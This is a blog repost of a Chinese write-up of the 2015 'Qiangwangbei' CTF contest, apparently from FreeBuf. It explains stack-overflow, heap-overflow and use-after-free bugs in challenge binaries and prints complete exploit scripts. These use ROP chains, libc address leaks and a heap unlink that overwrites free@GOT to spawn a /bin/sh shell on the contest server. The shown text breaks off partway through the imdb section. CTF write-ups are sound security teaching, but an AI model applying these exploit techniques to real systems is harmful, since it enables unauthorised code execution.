
 <!DOCTYPE HTML>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="baidu-site-verification" content="1XvvwQ7Apt" />
  
    <title>“强网杯”网络安全挑战赛WriteUp - | dianzi blog</title>
    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
    
    <meta name="author" content="edwin">
    

    
    <meta name="description" content="&amp;#x201C;&amp;#x5F3A;&amp;#x7F51;&amp;#x676F;&amp;#x201D;&amp;#x7F51;&amp;#x7EDC;&amp;#x5B89;&amp;#x5168;&amp;#x6311;&amp;#x6218;&amp;#x8D5B;WriteUp &amp;#x65F6;&amp;#x95F4;&amp;#xA0;2015-06-07 11:53:20  FreeBuf
&amp;#x539F;&amp;#x6587;&amp;#xA0; http://www.freebuf.com">
<meta property="og:type" content="article">
<meta property="og:title" content="“强网杯”网络安全挑战赛WriteUp -">
<meta property="og:url" content="http://taojinke.github.io/2015/06/07/20150607/f910270/index.html">
<meta property="og:site_name" content="dianzi blog">
<meta property="og:description" content="&amp;#x201C;&amp;#x5F3A;&amp;#x7F51;&amp;#x676F;&amp;#x201D;&amp;#x7F51;&amp;#x7EDC;&amp;#x5B89;&amp;#x5168;&amp;#x6311;&amp;#x6218;&amp;#x8D5B;WriteUp &amp;#x65F6;&amp;#x95F4;&amp;#xA0;2015-06-07 11:53:20  FreeBuf
&amp;#x539F;&amp;#x6587;&amp;#xA0; http://www.freebuf.com">
<meta property="og:image" content="http://img2.tuicool.com/AbYb6ju.jpg">
<meta property="og:image" content="http://img1.tuicool.com/JryEBzf.jpg">
<meta property="og:image" content="http://img2.tuicool.com/ieAzUr.jpg">
<meta property="og:image" content="http://img2.tuicool.com/vuUBBn.jpg">
<meta property="og:image" content="http://img0.tuicool.com/3IrIne2.jpg">
<meta property="og:image" content="http://img0.tuicool.com/7b2UnmF.jpg">
<meta property="og:image" content="http://img2.tuicool.com/zIBzQbf.jpg">
<meta property="og:image" content="http://img0.tuicool.com/iu22EnM.jpg">
<meta property="og:image" content="http://img0.tuicool.com/MZJ32eb.jpg">
<meta property="og:image" content="http://img1.tuicool.com/bmAJZn3.jpg">
<meta property="og:image" content="http://img0.tuicool.com/NraYf2R.jpg">
<meta property="og:image" content="http://img1.tuicool.com/ANnYFb.jpg">
<meta property="og:image" content="http://img2.tuicool.com/2ueuYn.jpg">
<meta property="og:image" content="http://img0.tuicool.com/J3mumaF.jpg">
<meta property="og:image" content="http://img2.tuicool.com/eMnIjq.jpg">
<meta property="og:image" content="http://img1.tuicool.com/Q3iaAjy.jpg">
<meta property="og:image" content="http://img0.tuicool.com/2EVBvmJ.jpg">
<meta property="og:image" content="http://img1.tuicool.com/3eyAJvn.jpg">
<meta property="og:image" content="http://img0.tuicool.com/Efy26n.jpg">
<meta property="og:image" content="http://img2.tuicool.com/I7ry6zE.jpg">
<meta property="og:updated_time" content="2015-06-07T10:21:34.449Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="“强网杯”网络安全挑战赛WriteUp -">
<meta name="twitter:description" content="&amp;#x201C;&amp;#x5F3A;&amp;#x7F51;&amp;#x676F;&amp;#x201D;&amp;#x7F51;&amp;#x7EDC;&amp;#x5B89;&amp;#x5168;&amp;#x6311;&amp;#x6218;&amp;#x8D5B;WriteUp &amp;#x65F6;&amp;#x95F4;&amp;#xA0;2015-06-07 11:53:20  FreeBuf
&amp;#x539F;&amp;#x6587;&amp;#xA0; http://www.freebuf.com">

    
    <link rel="alternative" href="/atom.xml" title="dianzi blog" type="application/atom+xml">
    
    
    <link rel="icon" href="/img/favicon.ico">
    
    
    <link rel="apple-touch-icon" href="/img/jacman.jpg">
    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
    
    <link rel="stylesheet" href="/css/style.css" type="text/css">

  <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?345f95aea4ada2935d6f9ea4177b51ab";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>

</head>

  <body>
    <header>
      
<div>
		
			<div id="imglogo">
				<a href="/"><img src="/img/logo.png" alt="dianzi blog" title="dianzi blog"/></a>
			</div>
			
			<div id="textlogo">
				<h1 class="site-name"><a href="/" title="dianzi blog">dianzi blog</a></h1>
				<h2 class="blog-motto"></h2>
			</div>
			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
			</a></div>
			<nav class="animated">
				<ul>
					<ul>
					 
						<li><a href="/">Home</a></li>
					
						<li><a href="/archives">Archives</a></li>
					
						<li><a href="/about">About</a></li>
					
					<li>
						<a href="/music/index.html" target="_blank">Music</a>
					</li>
					<li>
 					
						<form class="search" action="http://taojinke.github.io/" target="_blank">
							<label>Search</label>
						<input name="s" type="hidden" value= null ><input type="text" name="q" size="30" placeholder="搜索"><br>
						</form>
					
					</li>
				</ul>
			</nav>			
</div>

    </header>
    <div id="container">
      <div id="main" class="post" itemscope itemprop="blogPost">
  
	<article itemprop="articleBody"> 
		<header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2015/06/07/20150607/f910270/" title="“强网杯”网络安全挑战赛WriteUp -" itemprop="url">“强网杯”网络安全挑战赛WriteUp -</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="edwin" target="_blank" itemprop="author">edwin</a>
		
  <p class="article-time">
    <time datetime="2015-06-06T22:21:34.000Z" itemprop="datePublished"> 发表于 2015-06-07</time>
    
  </p>
</header>
	<div class="article-content">
		
		<div id="toc" class="toc-article">
			<strong class="toc-title">文章目录</strong>
		
			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#“强网杯”网络安全挑战赛WriteUp"><span class="toc-number">1.</span> <span class="toc-text">“强网杯”网络安全挑战赛WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Guess"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">Guess</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#溢出点："><span class="toc-number">1.0.0.2.</span> <span class="toc-text">溢出点：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用："><span class="toc-number">1.0.0.3.</span> <span class="toc-text">利用：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用脚本："><span class="toc-number">1.0.0.4.</span> <span class="toc-text">利用脚本：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#urldecoder"><span class="toc-number">1.0.0.5.</span> <span class="toc-text">urldecoder</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shellman"><span class="toc-number">1.0.0.6.</span> <span class="toc-text">shellman</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用：-1"><span class="toc-number">1.0.0.7.</span> <span class="toc-text">利用：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#imdb"><span class="toc-number">1.0.0.8.</span> <span class="toc-text">imdb</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞点："><span class="toc-number">1.0.0.9.</span> <span class="toc-text">漏洞点：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用：-2"><span class="toc-number">1.0.0.10.</span> <span class="toc-text">利用：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#domain_db"><span class="toc-number">1.0.0.11.</span> <span class="toc-text">domain_db</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞："><span class="toc-number">1.0.0.12.</span> <span class="toc-text">漏洞：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用过程大致如下："><span class="toc-number">1.0.0.13.</span> <span class="toc-text">利用过程大致如下：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#俳句自动打分系统"><span class="toc-number">1.0.0.14.</span> <span class="toc-text">俳句自动打分系统</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Flager-checker"><span class="toc-number">1.0.0.15.</span> <span class="toc-text">Flager-checker</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Keygen"><span class="toc-number">1.0.0.16.</span> <span class="toc-text">Keygen</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Broken"><span class="toc-number">1.0.0.17.</span> <span class="toc-text">Broken</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NESTING_DOLL"><span class="toc-number">1.0.0.18.</span> <span class="toc-text">NESTING DOLL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Repartition:"><span class="toc-number">1.0.0.19.</span> <span class="toc-text">Repartition:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Salt"><span class="toc-number">1.0.0.20.</span> <span class="toc-text">Salt</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#先用python写了一个爆破，结果太慢了，有用c写了一个"><span class="toc-number">1.0.0.21.</span> <span class="toc-text">先用python写了一个爆破，结果太慢了，有用c写了一个</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#最后获取的flag为Congratulations,_flag_is_flag{ha5h_ex7ens1on_r0cks!}"><span class="toc-number">1.0.0.22.</span> <span class="toc-text">最后获取的flag为Congratulations, flag is flag{ha5h_ex7ens1on_r0cks!}</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#*作者：墨客，本文属FreeBuf原创奖励计划，未经许可禁止转载"><span class="toc-number">1.0.0.23.</span> <span class="toc-text">*作者：墨客，本文属FreeBuf原创奖励计划，未经许可禁止转载</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#我来评几句"><span class="toc-number">1.0.0.23.1.</span> <span class="toc-text">我来评几句</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
		
		</div>
		
		<h1 id="&#x201C;&#x5F3A;&#x7F51;&#x676F;&#x201D;&#x7F51;&#x7EDC;&#x5B89;&#x5168;&#x6311;&#x6218;&#x8D5B;WriteUp">&#x201C;&#x5F3A;&#x7F51;&#x676F;&#x201D;&#x7F51;&#x7EDC;&#x5B89;&#x5168;&#x6311;&#x6218;&#x8D5B;WriteUp</h1><p> &#x65F6;&#x95F4;&#xA0;2015-06-07 11:53:20  <a href="/sites/MNnABb">FreeBuf</a></p>
<p><em>&#x539F;&#x6587;</em>&#xA0; <a href="http://www.freebuf.com/articles/web/69260.html?utm_source=tuicool" target="_blank" rel="external">http://www.freebuf.com/articles/web/69260.html</a></p>
<p> &#x4E3B;&#x9898; <a href="/topics/10000101">&#x7F51;&#x7EDC;&#x5B89;&#x5168;</a><a href="/topics/11100078">&#x52A0;&#x5BC6;&#x89E3;&#x5BC6;</a></p>
<p>  &#x201C;&#x5F3A;&#x7F51;&#x676F;&#x201D;&#x6311;&#x6218;&#x8D5B;&#x662F;&#x9762;&#x5411;&#x56FD;&#x5185;&#x4FE1;&#x606F;&#x5B89;&#x5168;&#x4F01;&#x4E1A;&#xFF08;&#x56E2;&#x961F;&#xFF09;&#x548C;&#x9AD8;&#x7B49;&#x9662;&#x6821;&#x7684;&#x56FD;&#x5BB6;&#x7EA7;&#x7F51;&#x7EDC;&#x5B89;&#x5168;&#x8D5B;&#x4E8B;&#xFF0C;&#x4E5F;&#x662F;&#x7B2C;&#x4E8C;&#x5C4A;&#x56FD;&#x5BB6;&#x7F51;&#x7EDC;&#x5B89;&#x5168;&#x5BA3;&#x4F20;&#x5468;&#x7684;&#x91CD;&#x8981;&#x6D3B;&#x52A8;&#x4E4B;&#x4E00;&#x3002;</p>
<h4 id="Guess">Guess</h4><h4 id="&#x6EA2;&#x51FA;&#x70B9;&#xFF1A;">&#x6EA2;&#x51FA;&#x70B9;&#xFF1A;</h4><p>&#x7A0B;&#x5E8F;&#x662F;&#x4E2A;&#x6309;&#x56FE;&#x56DE;&#x7B54;&#x7684;&#x6E38;&#x620F;&#xFF0C;&#x6E38;&#x620F;&#x901A;&#x5173;&#x540E;&#x4F1A;&#x8BA9;&#x8F93;&#x5165;&#x90AE;&#x7BB1;&#xFF0C;&#x4F1A;&#x6253;&#x5370;</p>
<p>Thank you so much! I will send you a gift, bye!</p>
<p>&#x6700;&#x5F00;&#x59CB;&#x624B;&#x8BD5;&#x4E86;&#x4E24;&#x628A;&#xFF0C;&#x8F93;&#x5165;&#x6B63;&#x786E;&#x7684;&#x90AE;&#x7BB1;&#xFF0C;&#x4F46;&#x662F;flag&#x90FD;&#x6CA1;&#x6709;&#x53D1;&#x5230;&#x90AE;&#x7BB1;&#x91CC;&#x3002;</p>
<p>&#x4ED4;&#x7EC6;&#x770B;&#x7A0B;&#x5E8F;&#xFF0C;&#x624D;&#x53D1;&#x73B0;&#x662F;&#x4E2A;&#x6808;&#x6EA2;&#x51FA;&#x3002;</p>
<p><img src="http://img2.tuicool.com/AbYb6ju.jpg" alt=""></p>
<h4 id="&#x5229;&#x7528;&#xFF1A;">&#x5229;&#x7528;&#xFF1A;</h4><p>&#x8FD9;&#x4E2A;&#x7A0B;&#x5E8F;&#x6CA1;&#x6709;&#x7ED9;libc&#x5E93;&#xFF0C;&#x8981;&#x62FF;shell&#x6BD4;&#x8F83;&#x56F0;&#x96BE;&#xFF0C;&#x4E0D;&#x8FC7;&#x7A0B;&#x5E8F;&#x4E2D;&#x6709;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#x7684;&#x51FD;&#x6570;&#xFF0C;</p>
<p><img src="http://img1.tuicool.com/JryEBzf.jpg" alt=""></p>
<p>&#x6240;&#x4EE5;&#x76F4;&#x63A5;&#x6784;&#x9020;rop&#x53BB;&#x8BFB;&#x53D6;flag&#x6587;&#x4EF6;&#x3002;</p>
<h4 id="&#x5229;&#x7528;&#x811A;&#x672C;&#xFF1A;">&#x5229;&#x7528;&#x811A;&#x672C;&#xFF1A;</h4><pre><code>from zio <span class="built_in">import</span> <span class="built_in">*</span>
target = <span class="params">(&amp;apos;<span class="number">119.254</span>.<span class="number">101.197</span>&amp;apos;,<span class="number">10000</span>)</span>
<span class="built_in">#</span>target = &amp;apos;./guess&amp;apos;
def <span class="built_in">exp</span><span class="params">(target)</span>:
    io = zio<span class="params">(target, timeout=<span class="number">10000</span>, print_read=COLORED<span class="params">(RAW, &amp;apos;red&amp;apos;)</span>, print_write=COLORED<span class="params">(RAW, &amp;apos;green&amp;apos;)</span>)</span>
    io.gdb_hint<span class="params">()</span>
    d = io.read_until<span class="params">(&amp;apos;What&amp;apos;)</span>.split<span class="params">(&amp;apos;What&amp;apos;)</span>[<span class="number">0</span>]
    addr = <span class="number">0</span>x08048830
    io.writeline<span class="params">(&amp;apos;a&amp;apos;*<span class="number">0</span>x9c+l32<span class="params">(addr)</span>+l32<span class="params">(<span class="number">0</span>)</span>+l32<span class="params">(<span class="number">0</span>x0804A100)</span>)</span>
    io.read_until<span class="params">(&amp;apos;!\n&amp;apos;)</span>
    <span class="built_in">#</span><span class="keyword">for</span> i in range<span class="params">(<span class="number">9</span>)</span>:
    <span class="keyword">for</span> i in range<span class="params">(<span class="number">5</span>)</span>:
        d = io.read_until<span class="params">(&amp;apos;What&amp;apos;)</span>.split<span class="params">(&amp;apos;What&amp;apos;)</span>[<span class="number">0</span>]
        <span class="keyword">if</span> &amp;apos;quu&amp;apos; in d:
            io.writeline<span class="params">(&amp;apos;pikachu&amp;apos;)</span>
        elif &amp;apos;COOL&amp;apos; in d:
            io.writeline<span class="params">(&amp;apos;peanuts&amp;apos;)</span>
        elif &amp;apos;bug&amp;apos; in d:
            io.writeline<span class="params">(&amp;apos;batman&amp;apos;)</span>
        elif &amp;apos;<span class="number">88888888888</span>&amp;apos; in d:
            io.writeline<span class="params">(&amp;apos;linux&amp;apos;)</span>
        elif &amp;apos;==o==&amp;apos; in d:
            io.writeline<span class="params">(&amp;apos;superman&amp;apos;)</span>
    io.read_until<span class="params">(&amp;apos;email:&amp;apos;)</span>
    io.writeline<span class="params">(&amp;apos;flag&amp;apos;)</span>
    io.interact<span class="params">()</span>
<span class="built_in">exp</span><span class="params">(target)</span>
</code></pre><h4 id="urldecoder">urldecoder</h4><p>&#x5728;url&#x89E3;&#x7801;&#x51FD;&#x6570;&#x4E2D;&#x867D;&#x7136;&#x5BF9;&#x957F;&#x5EA6;&#x505A;&#x4E86;&#x9650;&#x5236;&#xFF0C;&#x4E0D;&#x8FC7;&#x5BF9;%&#x540E;&#x9762;&#x7684;&#x4E24;&#x4E2A;&#x5B57;&#x7B26;&#x6CA1;&#x6709;&#x505A;&#x4E25;&#x683C;&#x7684;&#x5224;&#x65AD;&#xFF0C;&#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x5728;%&#x540E;&#x9762;&#x7684;&#x4E24;&#x4E2A;&#x5B57;&#x7B26;&#x4E2D;&#x653E;&#x4E00;&#x4E2A;\x00&#x7ED5;&#x8FC7;strlen&#x7684;&#x5224;&#x65AD;&#xFF0C;&#x4ECE;&#x800C;&#x6808;&#x6EA2;&#x51FA;&#x3002;</p>
<p><img src="http://img2.tuicool.com/ieAzUr.jpg" alt=""></p>
<p><img src="http://img2.tuicool.com/vuUBBn.jpg" alt=""></p>
<pre><code>&amp;#x811A<span class="comment">;&amp;#x672C;&amp;#x5982;&amp;#x4E0B;&amp;#xFF1A;</span>
from zio import *
target = <span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;119.254.101.197&amp;apos;,10001)</span>
#target = <span class="keyword">&amp;apos</span><span class="comment">;./urldecoder&amp;apos;</span>
def exp<span class="list">(<span class="keyword">target</span>)</span>:
     io = zio<span class="list">(<span class="keyword">target</span>, timeout=10000, print_read=COLORED<span class="list">(<span class="keyword">RAW</span>, <span class="keyword">&amp;apos</span><span class="comment">;red&amp;apos;), print_write=COLORED(RAW, &amp;apos;green&amp;apos;))</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;URL:&amp;apos;)</span>
     pop_ebp_ret    = <span class="number">0</span>x080488D2
     puts_plt = <span class="number">0</span>x08048530
     puts_got = <span class="number">0</span>x08049DE8
     read_fun = <span class="number">0</span>x08048720
     main = <span class="number">0</span>x08048590
     payload = <span class="keyword">&amp;apos</span><span class="comment">;http://%\x32\x00&amp;apos;+&amp;apos;a&amp;apos;*0x94 + l32(puts_plt) + l32(pop_ebp_ret) + l32(puts_got)</span>
     payload += l32<span class="list">(<span class="keyword">main</span>)</span>
     payload += <span class="keyword">&amp;apos</span><span class="comment">;\x00&amp;apos;</span>
     io.writeline<span class="list">(<span class="keyword">payload</span>)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;\n&amp;apos;)</span>
     puts_addr = l32<span class="list">(<span class="keyword">io</span>.read<span class="list">(<span class="number">4</span>)</span>)</span>
     print hex<span class="list">(<span class="keyword">puts_addr</span>)</span>
     libc_base = puts_addr - <span class="number">0</span>x00065650
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;URL:&amp;apos;)</span>
     system_addr = libc_base + <span class="number">0</span>x00040190
     binsh_addr = libc_base + <span class="number">0</span>x00160A24
     payload = <span class="keyword">&amp;apos</span><span class="comment">;http://%\x32\x00&amp;apos;+&amp;apos;a&amp;apos;*0x94 + l32(system_addr) + l32(pop_ebp_ret) + l32(binsh_addr)</span>
     io.writeline<span class="list">(<span class="keyword">payload</span>)</span>
     io.interact<span class="list">()</span>
exp<span class="list">(<span class="keyword">target</span>)</span></span></span></span></span></span></span>
</code></pre><h4 id="shellman">shellman</h4><p>&#x5728;edit&#x7684;&#x65F6;&#x5019;&#x6CA1;&#x6709;&#x5BF9;&#x957F;&#x5EA6;&#x505A;&#x5224;&#x65AD;&#xFF0C;&#x5B58;&#x5728;&#x5806;&#x6EA2;&#x51FA;</p>
<p><img src="http://img0.tuicool.com/3IrIne2.jpg" alt=""></p>
<h4 id="&#x5229;&#x7528;&#xFF1A;-1">&#x5229;&#x7528;&#xFF1A;</h4><p>&#x53C2;&#x8003;&#x4E86;217&#x7684;0ctf freenote&#x7684;writeup&#x4E2D;&#x7684;&#x601D;&#x8DEF;&#xFF0C;&#x901A;&#x8FC7;&#x5806;&#x6EA2;&#x51FA;&#xFF0C;&#x4FEE;&#x6539;&#x4E0B;&#x4E00;&#x5757;&#x5806;&#x7684;size&#x5B57;&#x8282;&#x4E2D;&#x7684;prev_inuse&#x6BD4;&#x7279;&#x4F4D;&#xFF0C;&#x8BA9;&#x4E0B;&#x4E00;&#x5757;&#x5806;&#x8BEF;&#x8BA4;&#x4E3A;&#x5176;&#x4E0A;&#x4E00;&#x5757;&#x5806;&#x5904;&#x4E8E;&#x7A7A;&#x95F2;&#x6001;&#x3002;</p>
<p>&#x4E4B;&#x540E;&#x5728;free &#x4E0B;&#x4E00;&#x5757;&#x5806;&#x65F6;&#xFF0C;&#x540E;&#x8C03;&#x7528;unlink&#x3002;&#x901A;&#x8FC7;&#x4F2A;&#x9020;&#x7684;&#x4E0A;&#x4E00;&#x5757;&#x5806;&#x7ED3;&#x6784;&#xFF0C;&#x4FEE;&#x6539;&#x4E86;bss&#x8282;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x5806;&#x6307;&#x9488;&#x3002;</p>
<p>&#x4E4B;&#x540E;&#x5229;&#x7528;&#x7A0B;&#x5E8F;&#x7684;edit&#x548C;show&#x529F;&#x80FD;&#xFF0C;&#x5B9E;&#x73B0;&#x5185;&#x5B58;&#x7684;&#x4EFB;&#x610F;&#x8BFB;&#x5199;&#x3002;</p>
<pre><code>&amp;#x5229<span class="comment">;&amp;#x7528;&amp;#x811A;&amp;#x672C;&amp;#xFF1A;</span>
from zio import *
target = <span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;119.254.101.197&amp;apos;, 10002)</span>
#target = <span class="keyword">&amp;apos</span><span class="comment">;./shellman&amp;apos;</span>
def new_sc<span class="list">(<span class="keyword">io</span>, sc)</span>:
    io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;&amp;gt;&amp;apos;)</span>
    io.writeline<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;2&amp;apos;)</span>
    io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;:&amp;apos;)</span>
    io.writeline<span class="list">(<span class="keyword">str</span><span class="list">(<span class="keyword">len</span><span class="list">(<span class="keyword">sc</span>)</span>)</span>)</span>
    io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;:&amp;apos;)</span>
    io.write<span class="list">(<span class="keyword">sc</span>)</span>
def edit_sc<span class="list">(<span class="keyword">io</span>, index, new_sc)</span>:
    io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;&amp;gt;&amp;apos;)</span>
    io.writeline<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;3&amp;apos;)</span>
    io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;:&amp;apos;)</span>
    io.writeline<span class="list">(<span class="keyword">str</span><span class="list">(<span class="keyword">index</span>)</span>)</span>
    io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;:&amp;apos;)</span>
    io.writeline<span class="list">(<span class="keyword">str</span><span class="list">(<span class="keyword">len</span><span class="list">(<span class="keyword">new_sc</span>)</span>)</span>)</span>
    io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;:&amp;apos;)</span>
    io.write<span class="list">(<span class="keyword">new_sc</span>)</span>
def delete_sc<span class="list">(<span class="keyword">io</span>, index)</span>:
    io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;&amp;gt;&amp;apos;)</span>
    io.writeline<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;4&amp;apos;)</span>
    io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;:&amp;apos;)</span>
    io.writeline<span class="list">(<span class="keyword">str</span><span class="list">(<span class="keyword">index</span>)</span>)</span>
def list_sc<span class="list">(<span class="keyword">io</span>)</span>:
    io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;&amp;gt;&amp;apos;)</span>
    io.writeline<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;1&amp;apos;)</span>
    io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;SHELLC0DE 0: &amp;apos;)</span>
    return l64<span class="list">(<span class="keyword">io</span>.read<span class="list">(<span class="number">16</span>)</span>.decode<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;hex&amp;apos;))</span>
def exp<span class="list">(<span class="keyword">target</span>)</span>:
    #io = zio<span class="list">(<span class="keyword">target</span>, timeout=10000, print_read=COLORED<span class="list">(<span class="keyword">REPR</span>, <span class="keyword">&amp;apos</span><span class="comment">;red&amp;apos;), print_write=COLORED(REPR, &amp;apos;green&amp;apos;))</span>
    io = zio<span class="list">(<span class="keyword">target</span>, timeout=10000, print_read=COLORED<span class="list">(<span class="keyword">RAW</span>, <span class="keyword">&amp;apos</span><span class="comment">;red&amp;apos;), print_write=COLORED(RAW, &amp;apos;green&amp;apos;))</span>
    new_sc<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;a&amp;apos;*0xa0) #0x603010</span>
    new_sc<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;b&amp;apos;*0xa0) #0x6030c0</span>
    new_sc<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;/bin/sh;&amp;apos;+&amp;apos;c&amp;apos;*0x98) #0x603170</span>
    ptr_addr = <span class="number">0</span>x00000000006016d0
    #                              rax                  rdx
    payload = l64<span class="list">(<span class="number">0</span>)</span> + l64<span class="list">(<span class="number">0</span>xa1)</span> + l64<span class="list">(<span class="keyword">ptr_addr-0x18</span>)</span> + l64<span class="list">(<span class="keyword">ptr_addr-0x10</span>)</span> + <span class="keyword">&amp;apos</span><span class="comment">;a&amp;apos;*0x80 + l64(0xa0) + l64(0xb0)</span>
    edit_sc<span class="list">(<span class="keyword">io</span>, <span class="number">0</span>, payload)</span> # change <span class="variable">*0x6016d0 = 0x6016b8
    delete_sc(io, 1)
    free_got = 0x0000000000601600
    payload2 = l64(0) + l64(1) +l64(0xa0) + l64(free_got)
    edit_sc(io, 0, payload2)
    free_addr = list_sc(io)
    print hex(free_addr)
    #local
    &amp;apos;&amp;apos;&amp;apos;
    system_addr = 0x00007FFFF7A5B640
    &amp;apos;&amp;apos;&amp;apos;
    libc_base = free_addr - 0x0000000000082DF0
    system_addr = libc_base + 0x0000000000046640
    edit_sc(io, 0, l64(system_addr))
    delete_sc(io, 2)
    io.interact()
exp(target)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>
</code></pre><h4 id="imdb">imdb</h4><h4 id="&#x6F0F;&#x6D1E;&#x70B9;&#xFF1A;">&#x6F0F;&#x6D1E;&#x70B9;&#xFF1A;</h4><p>&#x5728;&#x5220;&#x9664;&#x64CD;&#x4F5C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x5C06;&#x6240;&#x6709;&#x540C;&#x540D;&#x7684;&#x5168;&#x90E8;&#x5220;&#x9664;&#xFF0C;&#x4F46;&#x662F;&#x53EA;&#x4F1A;&#x5C06;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x7684;&#x6307;&#x9488;&#x6E05;0&#xFF0C;&#x5B58;&#x5728;uaf&#x6F0F;&#x6D1E;&#x3002;</p>
<p><img src="http://img0.tuicool.com/7b2UnmF.jpg" alt=""></p>
<p><img src="http://img2.tuicool.com/zIBzQbf.jpg" alt=""></p>
<h4 id="&#x5229;&#x7528;&#xFF1A;-2">&#x5229;&#x7528;&#xFF1A;</h4><p>&#x56E0;&#x4E3A;movie&#x548C;tv&#x7ED3;&#x6784;&#x4F53;&#x7684;&#x524D;4&#x5B57;&#x8282;&#x4E3A;&#x4E00;&#x4E2A;&#x865A;&#x8868;&#x6307;&#x9488;&#xFF0C;&#x6240;&#x4EE5;&#x8003;&#x8651;&#x4F2A;&#x9020;&#x865A;&#x8868;&#x3002;&#x4E0D;&#x8FC7;&#x56E0;&#x4E3A;&#x7A0B;&#x5E8F;&#x4E2D;&#x6240;&#x6709;&#x7528;&#x6237;&#x8F93;&#x5165;&#x7684;&#x6570;&#x636E;&#x90FD;&#x5B58;&#x50A8;&#x5728;&#x5806;&#x4E0A;&#xFF0C;&#x4F2A;&#x9020;&#x7684;&#x865A;&#x8868;&#x4E5F;&#x53EA;&#x80FD;&#x653E;&#x5728;&#x5806;&#x4E0A;&#xFF0C;&#x8981;&#x60F3;&#x83B7;&#x53D6;&#x4F2A;&#x9020;&#x865A;&#x8868;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x9700;&#x8981;&#x5148;&#x901A;&#x8FC7;&#x6CC4;&#x9732;&#x4E00;&#x4E2A;&#x5806;&#x6307;&#x9488;&#x5F97;&#x5230;&#x4F2A;&#x9020;&#x865A;&#x8868;&#x6240;&#x5728;&#x5730;&#x5740;&#x3002;&#x540C;&#x65F6;&#xFF0C;&#x4E3A;&#x4E86;&#x62FF;shell&#x8FD8;&#x9700;&#x8981;&#x83B7;&#x53D6;libc&#x5E93;&#x52A0;&#x8F7D;&#x57FA;&#x5730;&#x5740;&#x3002;</p>
<p>&#x5229;&#x7528;&#x6253;&#x5370;movie&#x4E2D;&#x7684;actors&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x7684;&#x8BFB;&#x53D6;&#x3002;</p>
<p><img src="http://img0.tuicool.com/iu22EnM.jpg" alt=""></p>
